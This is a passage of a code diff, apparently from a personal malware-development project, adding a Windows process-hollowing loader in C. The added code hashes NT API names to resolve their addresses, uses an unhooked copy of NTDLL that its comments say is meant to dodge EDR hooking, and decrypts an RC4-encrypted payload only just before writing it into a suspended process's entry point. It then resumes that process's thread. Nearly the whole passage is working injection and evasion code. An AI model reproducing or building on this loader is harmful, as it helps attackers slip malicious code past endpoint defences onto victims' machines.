+                //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
+            }
+        }
+
+}
+
+
+BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
+
+    printf("Size payload: %d\n", sPayload);
+
+
+    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
+    //to do this we first find the PEB then using offsets calculate the entry point
+
+    //step 1. find the PEB
+    //  _Out_     PVOID            ProcessInformation,
+
+    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
+    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
+    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
+    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+
+
+    //Because of API hashing we can obfuscate the struct and variable names but obviously not for readability.
+    NtQueryInformationProcessPtr QueryFunc = (NtQueryInformationProcessPtr)syscallsStruct.Query.pAddress;
+    NtReadVirtualMemoryPtr ReadFunc = (NtReadVirtualMemoryPtr)syscallsStruct.Read.pAddress;
+    NtVirtualProtectMemoryPtr ProtectFunc = (NtVirtualProtectMemoryPtr)syscallsStruct.Protect.pAddress;
+    NtResumeThreadPtr ResumeFunc = (NtResumeThreadPtr)syscallsStruct.Resume.pAddress;
+    NtWriteVirtualMemoryPtr WriteFunc = (NtWriteVirtualMemoryPtr)syscallsStruct.Write.pAddress;
+
+
+
+    NTSTATUS result = QueryFunc(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    //gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
+   
+    
+    //Goal: NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    printf("NTSTATUS????? %d", result);
+    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
+    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
+
+    //Now with PEB get offsets to image entry point 
+
+    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
+    BYTE procAddr[64];
+    BYTE procAddr2[64];
+
+    BYTE dataBuff[0x200];
+    SIZE_T bytesRW = 0;
+    // THis 64 is based on the architecture used...
+
+    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Base Address: 0x%p\n", BaseAddress);
+    //getchar();
+    printf("Starting NoahRead\n");
+    //getchar();
+
+
+    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+
+    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+
+    // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+
+
+    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
+    getchar();
+    result = ReadFunc(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    //goal: gCurrentSyscall = VxTable.Read.wRCXVal;
+    //Goal: result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    getchar();
+    printf("Enging NoahRead\n");
+
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
+    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
+    printf("&Proc Address (Working): 0x%p\n", *procAddr);
+    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
+
+    getchar();
+    uintptr_t executableAddress = *((uintptr_t*)procAddr);//
+
+    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
+    
+    result = ReadFunc(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+
+    //Goal: gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
+    //Goal: result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+
+    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
+    unsigned int rvaOffset = e_lfanew + 0x28;
+
+    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));
+
+    uintptr_t entrypointAddr = executableAddress + rva;
+    PVOID test = (PVOID)entrypointAddr;
+    ULONG sizer = sPayload;
+    DWORD oldPerm = PAGE_EXECUTE_READWRITE;
+
+    printf("Entrypoint: 0x%lp\n", test);
+    printf("Size payload: %d", sPayload);
+
+    PVOID sizeTest = (PVOID)sPayload;
+
+    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    
+    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
+    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
+    //Goal: gCurrentSyscall = VxTable.Protect.wRCXVal;
+    //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    result = ProtectFunc(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
+
+
+    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
+    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
+
+    printf("Address of optional header offset: 0x%p\n", e_lfanew);
+    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
+    printf("Executable ADDR: 0x%lp\n", executableAddress);
+    printf("Entrypoint ADDR: 0x%lp\n", test);
+    printf("Entrypoint: 0x%lp\n", entrypointAddr);
+    printf("Change Perms: %X\n", result);
+    getchar();
+
+    printf("\nentrypoint: 0x%p\n", entrypointAddr);
+    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
+    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
+    printf("&Test pvoid : 0x % p\n", &test);
+    printf("Test : 0x%p\n", test);
+
+    getchar();
+    ULONG read = 0;
+
+    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
+    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
+    printf("Key decrypted\n");
+    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    
+    
+    //Goal: gCurrentSyscall = VxTable.Write.wRCXVal;
+    //Goal: result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    getchar();
+    printf("Writing to entry point\n");
+    result = WriteFunc(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
+
+    // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
+    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
+
+    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
+
+    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
+    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
+    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
+    printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
+    getchar();
+
+    //ResumeThread(Pi.hThread);
+    PULONG suspendCount;
+
+    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
+    //goal: gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
+    //goal: result = NoahRead3(Pi.hThread, &suspendCount);
+    result = ResumeFunc(Pi.hThread, &suspendCount);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
+}
 
 
 int main() {
@@ -563,8 +698,68 @@ int main() {
 
     PVOID pLocalUnhookedModule = NULL;
     ReadNTDLL(piSuspended.hProcess, pLocalText, pRemoteText, sLocalTextSection, &pLocalUnhookedModule);
+
+    //Now we have an unhooked NTDLL so we  can use systemcalls and avoid api hooking from EDR
+
+
+
+
+
+
+    
+    SYSCALL Read = { 0 };
+    SYSCALL Write = { 0 };
+    SYSCALL Allocate = { 0 };
+    SYSCALL Protect = { 0 };
+    SYSCALL ResumThreade= { 0 };
+    SYSCALL Query = { 0 };
+
+
+    printf("WRITE\n");
+
+    //This one isnt being found...? but i see it in the debugger...???
+    syscallsStruct.Write = Write;
+    syscallsStruct.Write.dwHash = strtoull("C1189C40", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Write);
+
+    syscallsStruct.Read = Read;
+    syscallsStruct.Read.dwHash = strtoull("BE6B6431", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Read);
+
+    syscallsStruct.Allocate = Allocate;
+    syscallsStruct.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Allocate);
+
+    syscallsStruct.Protect = Protect;
+    syscallsStruct.Protect.dwHash = strtoull("87C51496", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Protect);
+
+    syscallsStruct.Resume = ResumThreade;
+    syscallsStruct.Resume.dwHash = strtoull("2F7CB09E", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Resume);
+
+    syscallsStruct.Query= Query;
+    syscallsStruct.Query.dwHash = strtoull("4F0DBC50", NULL, 16);
+    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Query);
+
+
+
+    //detectdebug
+
+    hollowProcess(piSuspended, sizeof(Rc4CipherText));
+
+ 
+
+
+//    () = ()GetProcAddress(hUnhookedDLL, "NtWriteProcessMemory");
+
+
+
    // ReadNTDLL(piSuspended.hProcess, pLocalText, sLocalTextSection,&pLocalUnhookedModule);
-    // This was a bit unintuitive to me at first, but because different processes share these DLL's (thats sorta what they're designed to be used for!)
+    // This was a bit unintu
+    // 
+    // 
+    // itive to me at first, but because different processes share these DLL's (thats sorta what they're designed to be used for!)
     // we dont actually need to read the newly created, suspended process, for the base NTDLL address within its memory space.  We can 
     // use the NTDLL base address within this CURRENT process and that will also work for our remote process.  its why different processes can use the same 
     // memory location to call the same function. same thought process. Makes it MUCH more convinient then what i initialy tried doing.
